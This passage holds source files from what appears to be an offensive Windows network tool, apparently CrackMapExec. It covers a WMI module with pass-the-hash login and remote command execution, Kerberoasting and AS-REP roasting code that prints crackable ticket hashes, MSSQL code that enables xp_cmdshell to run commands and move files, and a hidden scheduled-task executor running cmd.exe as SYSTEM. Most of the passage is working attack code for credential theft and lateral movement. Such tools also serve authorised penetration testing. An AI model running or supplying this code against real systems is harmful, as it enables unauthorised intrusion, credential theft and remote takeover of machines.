f""{domain}\\\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}""\n                if self.username == """" and self.password == """":\n                    out += ""(Default allow anonymous login)""\n                self.logger.success(out)\n                return True\n    \n    def hash_login(self, domain, username, ntlm_hash):\n        self.username = username\n        lmhash = \'\'\n        nthash = \'\'\n        if ntlm_hash.find(\':\') != -1:\n            self.lmhash, self.nthash = ntlm_hash.split(\':\')\n        else:\n            lmhash = \'\'\n            nthash = ntlm_hash\n        \n        self.nthash = nthash\n        self.lmhash = lmhash\n        \n        try:\n            self.conn.set_credentials(username=self.username, password=self.password, domain=self.domain, lmhash=lmhash, nthash=nthash)\n            dce = self.conn.get_dce_rpc()\n            dce.set_auth_type(RPC_C_AUTHN_WINNT)\n            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n            dce.connect()\n            dce.bind(MSRPC_UUID_PORTMAP)\n        except Exception as e:\n            dce.disconnect()\n            self.logger.debug(str(e))\n            out = f""{domain}\\\\{self.username}:{process_secret(self.nthash)} {str(e)}""\n            self.logger.fail(out, color=""red"")\n        else:\n            try:\n                # Get data from rpc connection if got vaild creds\n                entry_handle = epm.ept_lookup_handle_t()\n                request = epm.ept_lookup()\n                request[\'inquiry_type\'] = 0x0\n                request[\'object\'] = NULL\n                request[\'Ifid\'] = NULL\n                request[\'vers_option\'] = 0x1\n                request[\'entry_handle\'] = entry_handle\n                request[\'max_ents\'] = 1\n                resp = dce.request(request)\n            except  Exception as e:\n                dce.disconnect()\n                error_msg = str(e).lower()\n                self.logger.debug(error_msg)\n                for code in self.rpc_error_status.keys():\n                    if code in error_msg:\n                        error_msg = self.rpc_error_status[code]\n                self.logger.fail((f""{self.domain}\\\\{self.username}:{process_secret(self.nthash)} ({error_msg.upper()})""), color=(""red"" if ""access_denied"" in error_msg else ""magenta""))\n                return False\n            else:\n                self.check_if_admin()\n                dce.disconnect()\n                out = f""{domain}\\\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}""\n                if self.username == """" and self.password == """":\n                    out += ""(Default allow anonymous login)""\n                self.logger.success(out)\n                return True\n\n    # It\'s very complex to use wmi from rpctansport ""convert"" to dcom, so let we use dcom directly. \n    @requires_admin\n    def wmi(self, WQL=None, namespace=None):\n        results_WQL = ""\\r""\n        records = []\n        if not WQL:\n            WQL = self.args.wmi.strip(\'\\n\')\n\n        if not namespace:\n            namespace = self.args.wmi_namespace\n\n        try:\n            dcom = DCOMConnection(self.conn.getRemoteName(), self.username, self.password, self.domain, self.lmhash, self.nthash, oxidResolver=True, doKerberos=self.doKerberos ,kdcHost=self.kdcHost, aesKey=self.aesKey)\n            iInterface = dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login,IID_IWbemLevel1Login)\n            iWbemLevel1Login = IWbemLevel1Login(iInterface)\n            iWbemServices= iWbemLevel1Login.NTLMLogin(namespace , NULL, NULL)\n            iWbemLevel1Login.RemRelease()\n            iEnumWbemClassObject = iWbemServices.ExecQuery(WQL)\n        except Exception as e:\n            dcom.disconnect()\n            self.logger.debug(str(e))\n            self.logger.fail(\'Execute WQL error: {}\'.format(str(e)))\n            return False\n        else:\n            self.logger.info(f""Executing WQL syntax: {WQL}"")\n            while True:\n                try:\n                    wmi_results = iEnumWbemClassObject.Next(0xffffffff, 1)[0]\n                    record = wmi_results.getProperties()\n                    records.append(record)\n                    for k,v in record.items():\n                        self.logger.highlight(f""{k} => {v[\'value\']}"")\n                except Exception as e:\n                    if str(e).find(\'S_FALSE\') < 0:\n                        self.logger.debug(str(e))\n                    else:\n                        break\n\n            dcom.disconnect()\n\n            return records\n\n    @requires_admin\n    def execute(self, command=None, get_output=False):\n        output = """"\n        if not command:\n            command = self.args.execute\n\n        if not self.args.no_output:\n            get_output = True\n\n        if ""systeminfo"" in command and self.args.interval_time < 10:\n            self.logger.fail(""Execute \'systeminfo\' must set the interval time higher than 10 seconds"")\n            return False\n        \n        if self.server_os is not None and ""NT 5"" in self.server_os:\n            self.logger.fail(""Execute command failed, not support current server os (version < NT 6)"")\n            return False\n\n        if self.args.exec_method == ""wmiexec"":\n            exec_method = wmiexec.WMIEXEC(self.conn.getRemoteName(), self.username, self.password, self.domain, self.lmhash, self.nthash, self.doKerberos, self.kdcHost, self.aesKey, self.logger, self.args.interval_time, self.args.codec)\n            output = exec_method.execute(command, get_output)\n            \n        elif self.args.exec_method == ""wmiexec-event"":\n            exec_method = wmiexec_event.WMIEXEC_EVENT(self.conn.getRemoteName(), self.username, self.password, self.domain, self.lmhash, self.nthash, self.doKerberos, self.kdcHost, self.aesKey, self.logger, self.args.interval_time, self.args.codec)\n            output = exec_method.execute(command, get_output)\n\n        self.conn.disconnect()\n        if output == """" and get_output:\n            self.logger.fail(""Execute command failed, probabaly got detection by AV."")\n            return False\n        else:\n            self.logger.success(f\'Executed command: ""{command}"" via {self.args.exec_method}\')\n            buf = StringIO(output).readlines()\n            for line in buf:\n                self.logger.highlight(line.strip())\n            return output', 'database.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom pathlib import Path\nfrom sqlalchemy.orm import sessionmaker, scoped_session\nfrom sqlalchemy import MetaData, Table\nfrom sqlalchemy.exc import (\n    IllegalStateChangeError,\n    NoInspectionAvailable,\n    NoSuchTableError,\n)\nfrom cme.logger import cme_logger\n\n\nclass database:\n    def __init__(self, db_engine):\n        self.CredentialsTable = None\n        self.HostsTable = None\n\n        self.db_engine = db_engine\n        self.db_path = self.db_engine.url.database\n        self.protocol = Path(self.db_path).stem.upper()\n        self.metadata = MetaData()\n        self.reflect_tables()\n        session_factory = sessionmaker(bind=self.db_engine, expire_on_commit=True)\n\n        Session = scoped_session(session_factory)\n        # this is still named ""conn"" when it is the session object; TODO: rename\n        self.conn = Session()\n\n    @staticmethod\n    def db_schema(db_conn):\n        db_conn.execute(\n            """"""CREATE TABLE ""credentials"" (\n            ""id"" integer PRIMARY KEY,\n            ""username"" text,\n            ""password"" text\n            )""""""\n        )\n\n        db_conn.execute(\n            """"""CREATE TABLE ""hosts"" (\n            ""id"" integer PRIMARY KEY,\n            ""ip"" text,\n            ""hostname"" text,\n            ""port"" integer\n            )""""""\n        )\n\n    def reflect_tables(self):\n        with self.db_engine.connect() as conn:\n            try:\n                self.CredentialsTable = Table(""credentials"", self.metadata, autoload_with=self.db_engine)\n                self.HostsTable = Table(""hosts"", self.metadata, autoload_with=self.db_engine)\n            except (NoInspectionAvailable, NoSuchTableError):\n                print(\n                    f""""""\n                    [-] Error reflecting tables for the {self.protocol} protocol - this means there is a DB schema mismatch\n                    [-] This is probably because a newer version of CME is being ran on an old DB schema\n                    [-] Optionally save the old DB data (`cp {self.db_path} ~/cme_{self.protocol.lower()}.bak`)\n                    [-] Then remove the CME {self.protocol} DB (`rm -f {self.db_path}`) and run CME to initialize the new DB""""""\n                )\n                exit()\n\n    def shutdown_db(self):\n        try:\n            self.conn.close()\n        # due to the async nature of CME, sometimes session state is a bit messy and this will throw:\n        # Method \'close()\' can\'t be called here; method \'_connection_for_bind()\' is already in progress and\n        # this would cause an unexpected state change to <SessionTransactionState.CLOSED: 5>\n        except IllegalStateChangeError as e:\n            cme_logger.debug(f""Error while closing session db object: {e}"")\n\n    def clear_database(self):\n        for table in self.metadata.sorted_tables:\n            self.conn.execute(table.delete())\n', 'db_navigator.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom cme.cmedb import DatabaseNavigator, print_help\n\n\nclass navigator(DatabaseNavigator):\n    def do_clear_database(self, line):\n        if input(""This will destroy all data in the current database, are you SURE you want to run this? (y/n): "") == ""y"":\n            self.db.clear_database()\n\n    def help_clear_database(self):\n        help_string = """"""\n        clear_database\n        THIS COMPLETELY DESTROYS ALL DATA IN THE CURRENTLY CONNECTED DATABASE\n        YOU CANNOT UNDO THIS COMMAND\n        """"""\n        print_help(help_string)\n', 'proto_args.py': 'from argparse import _StoreTrueAction\n\ndef proto_args(parser, std_parser, module_parser):\n    wmi_parser = parser.add_parser(\'wmi\', help=""own stuff using WMI"", parents=[std_parser, module_parser], conflict_handler=\'resolve\')\n    wmi_parser.add_argument(""-H"", \'--hash\', metavar=""HASH"", dest=\'hash\', nargs=\'+\', default=[], help=\'NTLM hash(es) or file(s) containing NTLM hashes\')\n    wmi_parser.add_argument(""--port"", type=int, choices={135}, default=135, help=""WMI port (default: 135)"")\n    wmi_parser.add_argument(""--rpc-timeout"", help=""RPC/DCOM(WMI) connection timeout, default is %(default)s secondes"", type=int, default=2)\n\n    # For domain options\n    dgroup = wmi_parser.add_mutually_exclusive_group()\n    domain_arg = dgroup.add_argument(""-d"", metavar=""DOMAIN"", dest=\'domain\', default=None, type=str, help=""Domain to authenticate to"")\n    dgroup.add_argument(""--local-auth"", action=\'store_true\', help=\'Authenticate locally to each target\')\n\n    egroup = wmi_parser.add_argument_group(""Mapping/Enumeration"", ""Options for Mapping/Enumerating"")\n    egroup.add_argument(""--wmi"", metavar=\'QUERY\', dest=\'wmi\',type=str, help=\'Issues the specified WMI query\')\n    egroup.add_argument(""--wmi-namespace"", metavar=\'NAMESPACE\', type=str, default=\'root\\\\cimv2\', help=\'WMI Namespace (default: root\\\\cimv2)\')\n\n    cgroup = wmi_parser.add_argument_group(""Command Execution"", ""Options for executing commands"")\n    cgroup.add_argument(""--no-output"", action=""store_true"", help=""do not retrieve command output"")\n    cgroup.add_argument(""-x"", metavar=\'COMMAND\', dest=\'execute\', type=str, help=\'Creates a new cmd process and executes the specified command with output\')\n    cgroup.add_argument(""--exec-method"", choices={""wmiexec"", ""wmiexec-event""}, default=""wmiexec"",\n                            help=""method to execute the command. (default: wmiexec). ""\n                            ""[wmiexec (win32_process + StdRegProv)]: get command results over registry instead of using smb connection. ""\n                            ""[wmiexec-event (T1546.003)]: this method is not very stable, highly recommend use this method in single host, ""\n                            ""using on multiple hosts may crash (just try again if it crashed)."")\n    cgroup.add_argument(""--interval-time"", default=5 ,metavar=\'INTERVAL_TIME\', dest=\'interval_time\', type=int, help=\'Set interval time(seconds) when executing command, unrecommend set it lower than 5\')\n    cgroup.add_argument(""--codec"", default=""utf-8"",\n                            help=""Set encoding used (codec) from the target\'s output (default ""\n                                 ""\\""utf-8\\""). If errors are detected, run chcp.com at the target, ""\n                                 ""map the result with ""\n                                 ""https://docs.python.org/3/library/codecs.html#standard-encodings and then execute ""\n                                 ""again with --codec and the corresponding codec"")\n    return parser\n\ndef get_conditional_action(baseAction):\n    class ConditionalAction(baseAction):\n        def __init__(self, option_strings, dest, **kwargs):\n            x = kwargs.pop(\'make_required\', [])\n            super(ConditionalAction, self).__init__(option_strings, dest, **kwargs)\n            self.make_required = x\n\n        def __call__(self, parser, namespace, values, option_string=None):\n            for x in self.make_required:\n                x.required = True\n            super(ConditionalAction, self).__call__(parser, namespace, values, option_string)\n\n    return ConditionalAction', 'gmsa.py': 'from impacket.structure import Structure\n\n\nclass MSDS_MANAGEDPASSWORD_BLOB(Structure):\n    structure = (\n        (""Version"", ""<H""),\n        (""Reserved"", ""<H""),\n        (""Length"", ""<L""),\n        (""CurrentPasswordOffset"", ""<H""),\n        (""PreviousPasswordOffset"", ""<H""),\n        (""QueryPasswordIntervalOffset"", ""<H""),\n        (""UnchangedPasswordIntervalOffset"", ""<H""),\n        (""CurrentPassword"", "":""),\n        (""PreviousPassword"", "":""),\n        # (\'AlignmentPadding\',\':\'),\n        (""QueryPasswordInterval"", "":""),\n        (""UnchangedPasswordInterval"", "":""),\n    )\n\n    def __init__(self, data=None):\n        Structure.__init__(self, data=data)\n\n    def fromString(self, data):\n        Structure.fromString(self, data)\n\n        if self[""PreviousPasswordOffset""] == 0:\n            endData = self[""QueryPasswordIntervalOffset""]\n        else:\n            endData = self[""PreviousPasswordOffset""]\n\n        self[""CurrentPassword""] = self.rawData[self[""CurrentPasswordOffset""] :][: endData - self[""CurrentPasswordOffset""]]\n        if self[""PreviousPasswordOffset""] != 0:\n            self[""PreviousPassword""] = self.rawData[self[""PreviousPasswordOffset""] :][: self[""QueryPasswordIntervalOffset""] - self[""PreviousPasswordOffset""]]\n\n        self[""QueryPasswordInterval""] = self.rawData[self[""QueryPasswordIntervalOffset""] :][: self[""UnchangedPasswordIntervalOffset""] - self[""QueryPasswordIntervalOffset""]]\n        self[""UnchangedPasswordInterval""] = self.rawData[self[""UnchangedPasswordIntervalOffset""] :]\n', 'kerberos.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport random\nfrom binascii import hexlify, unhexlify\nfrom datetime import datetime, timedelta\nfrom os import getenv\n\nfrom impacket.krb5 import constants\nfrom impacket.krb5.asn1 import (\n    TGS_REP,\n    AS_REQ,\n    KERB_PA_PAC_REQUEST,\n    KRB_ERROR,\n    AS_REP,\n    seq_set,\n    seq_set_iter,\n)\nfrom impacket.krb5.ccache import CCache\nfrom impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT\nfrom impacket.krb5.types import KerberosTime, Principal\nfrom impacket.ntlm import compute_lmhash, compute_nthash\nfrom pyasn1.codec.der import decoder, encoder\nfrom pyasn1.type.univ import noValue\n\nfrom cme.logger import cme_logger\n\n\nclass KerberosAttacks:\n    def __init__(self, connection):\n        self.username = connection.username\n        self.password = connection.password\n        self.domain = connection.domain\n        self.targetDomain = connection.targetDomain\n        self.hash = connection.hash\n        self.lmhash = """"\n        self.nthash = """"\n        self.aesKey = connection.aesKey\n        self.kdcHost = connection.kdcHost\n        self.kerberos = connection.kerberos\n\n        if self.hash is not None:\n            if self.hash.find("":"") != -1:\n                self.lmhash, self.nthash = self.hash.split("":"")\n            else:\n                self.nthash = self.hash\n\n        if self.password is None:\n            self.password = """"\n\n    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):\n        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]\n\n        # According to RFC4757 (RC4-HMAC) the cipher part is like:\n        # struct EDATA {\n        #       struct HEADER {\n        #               OCTET Checksum[16];\n        #               OCTET Confounder[8];\n        #       } Header;\n        #       OCTET Data[0];\n        # } edata;\n        #\n        # In short, we\'re interested in splitting the checksum and the rest of the encrypted data\n        #\n        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)\n        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted\n        # ticket\n        if decodedTGS[""ticket""][""enc-part""][""etype""] == constants.EncryptionTypes.rc4_hmac.value:\n            entry = ""$krb5tgs$%d$*%s$%s$%s*$%s$%s"" % (\n                constants.EncryptionTypes.rc4_hmac.value,\n                username,\n                decodedTGS[""ticket""][""realm""],\n                spn.replace("":"", ""~""),\n                hexlify(decodedTGS[""ticket""][""enc-part""][""cipher""][:16].asOctets()).decode(),\n                hexlify(decodedTGS[""ticket""][""enc-part""][""cipher""][16:].asOctets()).decode(),\n            )\n        elif decodedTGS[""ticket""][""enc-part""][""etype""] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n            entry = ""$krb5tgs$%d$%s$%s$*%s*$%s$%s"" % (\n                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,\n                username,\n                decodedTGS[""ticket""][""realm""],\n                spn.replace("":"", ""~""),\n                hexlify(decodedTGS[""ticket""][""enc-part""][""cipher""][-12:].asOctets()).decode(),\n                hexlify(decodedTGS[""ticket""][""enc-part""][""cipher""][:-12:].asOctets()).decode,\n            )\n        elif decodedTGS[""ticket""][""enc-part""][""etype""] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n            entry = ""$krb5tgs$%d$%s$%s$*%s*$%s$%s"" % (\n                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,\n                username,\n                decodedTGS[""ticket""][""realm""],\n                spn.replace("":"", ""~""),\n                hexlify(decodedTGS[""ticket""][""enc-part""][""cipher""][-12:].asOctets()).decode(),\n                hexlify(decodedTGS[""ticket""][""enc-part""][""cipher""][:-12:].asOctets()).decode(),\n            )\n        elif decodedTGS[""ticket""][""enc-part""][""etype""] == constants.EncryptionTypes.des_cbc_md5.value:\n            entry = ""$krb5tgs$%d$*%s$%s$%s*$%s$%s"" % (\n                constants.EncryptionTypes.des_cbc_md5.value,\n                username,\n                decodedTGS[""ticket""][""realm""],\n                spn.replace("":"", ""~""),\n                hexlify(decodedTGS[""ticket""][""enc-part""][""cipher""][:16].asOctets()).decode(),\n                hexlify(decodedTGS[""ticket""][""enc-part""][""cipher""][16:].asOctets()).decode(),\n            )\n        else:\n            cme_logger.error(""Skipping"" f"" {decodedTGS[\'ticket\'][\'sname\'][\'name-string\'][0]}/{decodedTGS[\'ticket\'][\'sname\'][\'name-string\'][1]} due"" f"" to incompatible e-type {decodedTGS[\'ticket\'][\'enc-part\'][\'etype\']:d}"")\n\n        return entry\n\n    def getTGT_kerberoasting(self):\n        try:\n            ccache = CCache.loadFile(getenv(""KRB5CCNAME""))\n            # retrieve user and domain information from CCache file if needed\n            if self.domain == """":\n                domain = ccache.principal.realm[""data""]\n            else:\n                domain = self.domain\n            cme_logger.debug(""Using Kerberos Cache: %s"" % getenv(""KRB5CCNAME""))\n            principal = ""krbtgt/%s@%s"" % (domain.upper(), domain.upper())\n            creds = ccache.getCredential(principal)\n            if creds is not None:\n                TGT = creds.toTGT()\n                cme_logger.debug(""Using TGT from cache"")\n                return TGT\n            else:\n                cme_logger.debug(""No valid credentials found in cache. "")\n        except:\n            # No cache present\n            pass\n\n        # No TGT in cache, request it\n        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n\n        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the\n        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn\'t work, we use the\n        # cleartext password.\n        # If no clear text password is provided, we just go with the defaults.\n        if self.password != """" and (self.lmhash == """" and self.nthash == """"):\n            try:\n                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(\n                    userName,\n                    """",\n                    self.domain,\n                    compute_lmhash(self.password),\n                    compute_nthash(self.password),\n                    self.aesKey,\n                    kdcHost=self.kdcHost,\n                )\n            except Exception as e:\n                cme_logger.debug(""TGT: %s"" % str(e))\n                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(\n                    userName,\n                    self.password,\n                    self.domain,\n                    unhexlify(self.lmhash),\n                    unhexlify(self.nthash),\n                    self.aesKey,\n                    kdcHost=self.kdcHost,\n                )\n\n        else:\n            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(\n                userName,\n                self.password,\n                self.domain,\n                unhexlify(self.lmhash),\n                unhexlify(self.nthash),\n                self.aesKey,\n                kdcHost=self.kdcHost,\n            )\n        TGT = {}\n        TGT[""KDC_REP""] = tgt\n        TGT[""cipher""] = cipher\n        TGT[""sessionKey""] = sessionKey\n\n        return TGT\n\n    def getTGT_asroast(self, userName, requestPAC=True):\n        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n\n        asReq = AS_REQ()\n\n        domain = self.targetDomain.upper()\n        serverName = Principal(""krbtgt/%s"" % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n\n        pacRequest = KERB_PA_PAC_REQUEST()\n        pacRequest[""include-pac""] = requestPAC\n        encodedPacRequest = encoder.encode(pacRequest)\n\n        asReq[""pvno""] = 5\n        asReq[""msg-type""] = int(constants.ApplicationTagNumbers.AS_REQ.value)\n\n        asReq[""padata""] = noValue\n        asReq[""padata""][0] = noValue\n        asReq[""padata""][0][""padata-type""] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)\n        asReq[""padata""][0][""padata-value""] = encodedPacRequest\n\n        reqBody = seq_set(asReq, ""req-body"")\n\n        opts = list()\n        opts.append(constants.KDCOptions.forwardable.value)\n        opts.append(constants.KDCOptions.renewable.value)\n        opts.append(constants.KDCOptions.proxiable.value)\n        reqBody[""kdc-options""] = constants.encodeFlags(opts)\n\n        seq_set(reqBody, ""sname"", serverName.components_to_asn1)\n        seq_set(reqBody, ""cname"", clientName.components_to_asn1)\n\n        if domain == """":\n            cme_logger.error(""Empty Domain not allowed in Kerberos"")\n            return\n\n        reqBody[""realm""] = domain\n        now = datetime.utcnow() + timedelta(days=1)\n        reqBody[""till""] = KerberosTime.to_asn1(now)\n        reqBody[""rtime""] = KerberosTime.to_asn1(now)\n        reqBody[""nonce""] = random.getrandbits(31)\n\n        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)\n\n        seq_set_iter(reqBody, ""etype"", supportedCiphers)\n\n        message = encoder.encode(asReq)\n\n        try:\n            r = sendReceive(message, domain, self.kdcHost)\n        except KerberosError as e:\n            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:\n                # RC4 not available, OK, let\'s ask for newer types\n                supportedCiphers = (\n                    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),\n                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),\n                )\n                seq_set_iter(reqBody, ""etype"", supportedCiphers)\n                message = encoder.encode(asReq)\n                r = sendReceive(message, domain, self.kdcHost)\n            elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_KEY_EXPIRED.value:\n                return ""Password of user "" + userName + "" expired but user doesn\'t require pre-auth""\n            else:\n                cme_logger.debug(e)\n                return False\n\n        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the\n        # \'Do not require Kerberos preauthentication\' set\n        try:\n            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]\n        except:\n            # Most of the times we shouldn\'t be here, is this a TGT?\n            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]\n        else:\n            # The user doesn\'t have UF_DONT_REQUIRE_PREAUTH set\n            cme_logger.debug(""User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set"" % userName)\n            return\n\n        # Let\'s output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.\n        if asRep[\'enc-part\'][\'etype\'] == 17 or asRep[\'enc-part\'][\'etype\'] == 18:\n            hash_TGT = ""$krb5asrep$%d$%s@%s:%s$%s"" % (\n                asRep[""enc-part""][""etype""], clientName, domain,\n                hexlify(asRep[""enc-part""][""cipher""].asOctets()[:12]).decode(),\n                hexlify(asRep[""enc-part""][""cipher""].asOctets()[12:]).decode(),\n            )\n        else:\n            hash_TGT = \'$krb5asrep$%d$%s@%s:%s$%s\' % (\n                asRep[\'enc-part\'][\'etype\'], clientName, domain,\n                hexlify(asRep[\'enc-part\'][\'cipher\'].asOctets()[:16]).decode(),\n                hexlify(asRep[\'enc-part\'][\'cipher\'].asOctets()[16:]).decode()\n            )\n        return hash_TGT\n', 'mssqlexec.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport binascii\nfrom cme.logger import cme_logger\n\n\nclass MSSQLEXEC:\n    def __init__(self, connection):\n        self.mssql_conn = connection\n        self.outputBuffer = """"\n\n    def execute(self, command, output=False):\n        command_output = []\n        try:\n            self.enable_xp_cmdshell()\n        except Exception as e:\n            cme_logger.error(f""Error when attempting to enable x_cmdshell: {e}"")\n        try:\n            result = self.mssql_conn.sql_query(f""exec master..xp_cmdshell \'{command}\'"")\n            cme_logger.debug(f""SQL Query Result: {result}"")\n            for row in result:\n                if row[""output""] == ""NULL"":\n                    continue\n                command_output.append(row[""output""])\n        except Exception as e:\n            cme_logger.error(f""Error when attempting to execute command via xp_cmdshell: {e}"")\n\n        if output:\n            cme_logger.debug(f""Output is enabled"")\n            for row in command_output:\n                cme_logger.debug(row)\n            # self.mssql_conn.printReplies()\n            # self.mssql_conn.colMeta[0][""TypeData""] = 80 * 2\n            # self.mssql_conn.printRows()\n            # self.outputBuffer = self.mssql_conn._MSSQL__rowsPrinter.getMessage()\n            # if len(self.outputBuffer):\n            #     self.outputBuffer = self.outputBuffer.split(\'\\n\', 2)[2]\n        try:\n            self.disable_xp_cmdshell()\n        except Exception as e:\n            cme_logger.error(f""[OPSEC] Error when attempting to disable xp_cmdshell: {e}"")\n        return command_output\n        # return self.outputBuffer\n\n    def enable_xp_cmdshell(self):\n        self.mssql_conn.sql_query(""exec master.dbo.sp_configure \'show advanced options\',1;RECONFIGURE;exec master.dbo.sp_configure \'xp_cmdshell\', 1;RECONFIGURE;"")\n\n    def disable_xp_cmdshell(self):\n        self.mssql_conn.sql_query(""exec sp_configure \'xp_cmdshell\', 0 ;RECONFIGURE;exec sp_configure \'show advanced options\', 0 ;RECONFIGURE;"")\n\n    def enable_ole(self):\n        self.mssql_conn.sql_query(""exec master.dbo.sp_configure \'show advanced options\',1;RECONFIGURE;exec master.dbo.sp_configure \'Ole Automation Procedures\', 1;RECONFIGURE;"")\n\n    def disable_ole(self):\n        self.mssql_conn.sql_query(""exec master.dbo.sp_configure \'show advanced options\',1;RECONFIGURE;exec master.dbo.sp_configure \'Ole Automation Procedures\', 0;RECONFIGURE;"")\n\n    def put_file(self, data, remote):\n        try:\n            self.enable_ole()\n            hexdata = data.hex()\n            self.mssql_conn.sql_query(""DECLARE @ob INT;"" ""EXEC sp_OACreate \'ADODB.Stream\', @ob OUTPUT;"" ""EXEC sp_OASetProperty @ob, \'Type\', 1;"" ""EXEC sp_OAMethod @ob, \'Open\';"" ""EXEC sp_OAMethod @ob, \'Write\', NULL, 0x{};"" ""EXEC sp_OAMethod @ob, \'SaveToFile\', NULL, \'{}\', 2;"" ""EXEC sp_OAMethod @ob, \'Close\';"" ""EXEC sp_OADestroy @ob;"".format(hexdata, remote))\n            self.disable_ole()\n        except Exception as e:\n            cme_logger.debug(f""Error uploading via mssqlexec: {e}"")\n\n    def file_exists(self, remote):\n        try:\n            res = self.mssql_conn.batch(f""DECLARE @r INT; EXEC master.dbo.xp_fileexist \'{remote}\', @r OUTPUT; SELECT @r as n"")[0][""n""]\n            return res == 1\n        except:\n            return False\n\n    def get_file(self, remote, local):\n        try:\n            self.mssql_conn.sql_query(f""SELECT * FROM OPENROWSET(BULK N\'{remote}\', SINGLE_BLOB) rs"")\n            data = self.mssql_conn.rows[0][""BulkColumn""]\n\n            with open(local, ""wb+"") as f:\n                f.write(binascii.unhexlify(data))\n\n        except Exception as e:\n            cme_logger.debug(f""Error downloading via mssqlexec: {e}"")\n', 'atexec.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport os\nfrom impacket.dcerpc.v5 import tsch, transport\nfrom impacket.dcerpc.v5.dtypes import NULL\nfrom impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY\nfrom cme.helpers.misc import gen_random_string\nfrom time import sleep\n\n\nclass TSCH_EXEC:\n    def __init__(\n        self,\n        target,\n        share_name,\n        username,\n        password,\n        domain,\n        doKerberos=False,\n        aesKey=None,\n        kdcHost=None,\n        hashes=None,\n        logger=None,\n        tries=None,\n        share=None\n    ):\n        self.__target = target\n        self.__username = username\n        self.__password = password\n        self.__domain = domain\n        self.__share_name = share_name\n        self.__lmhash = """"\n        self.__nthash = """"\n        self.__outputBuffer = b""""\n        self.__retOutput = False\n        self.__aesKey = aesKey\n        self.__doKerberos = doKerberos\n        self.__kdcHost = kdcHost\n        self.__tries = tries\n        self.logger = logger\n\n        if hashes is not None:\n            # This checks to see if we didn\'t provide the LM Hash\n            if hashes.find("":"") != -1:\n                self.__lmhash, self.__nthash = hashes.split("":"")\n            else:\n                self.__nthash = hashes\n\n        if self.__password is None:\n            self.__password = """"\n\n        stringbinding = r""ncacn_np:%s[\\pipe\\atsvc]"" % self.__target\n        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)\n\n        if hasattr(self.__rpctransport, ""set_credentials""):\n            # This method exists only for selected protocol sequences.\n            self.__rpctransport.set_credentials(\n                self.__username,\n                self.__password,\n                self.__domain,\n                self.__lmhash,\n                self.__nthash,\n                self.__aesKey,\n            )\n            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)\n\n    def execute(self, command, output=False):\n        self.__retOutput = output\n        self.execute_handler(command)\n        return self.__outputBuffer\n\n    def output_callback(self, data):\n        self.__outputBuffer = data\n\n    def gen_xml(self, command, tmpFileName, fileless=False):\n        xml = """"""<?xml version=""1.0"" encoding=""UTF-16""?>\n<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">\n  <Triggers>\n    <CalendarTrigger>\n      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=""LocalSystem"">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <StopOnIdleEnd>true</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>true</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=""LocalSystem"">\n    <Exec>\n      <Command>cmd.exe</Command>\n""""""\n        if self.__retOutput:\n            if fileless:\n                local_ip = 